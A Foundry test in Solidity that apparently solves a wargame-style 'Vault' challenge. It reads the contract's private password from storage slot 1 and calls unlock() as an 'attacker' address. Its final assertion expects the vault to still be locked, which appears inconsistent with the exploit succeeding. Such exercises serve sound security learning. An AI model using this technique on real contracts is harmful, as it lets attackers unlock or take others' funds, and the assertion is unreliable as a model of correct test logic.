// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test{
    Vault vaultAddress;

    address attacker = mkaddr("attacker");
   
    function setUp() public {
        vaultAddress = Vault(0x1DCDD5d9A47e4A8773e3E28020B53ceA559BAeFd);
    }

    function testExploitVault() public{
        vm.startPrank(attacker);
        vaultAddress.locked();
        //fetch the password from storage slot 1
        bytes32 password = vm.load(address(vaultAddress), bytes32(uint256(1)));
        vaultAddress.unlock(password);
        assertEq(vaultAddress.locked(), true);
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}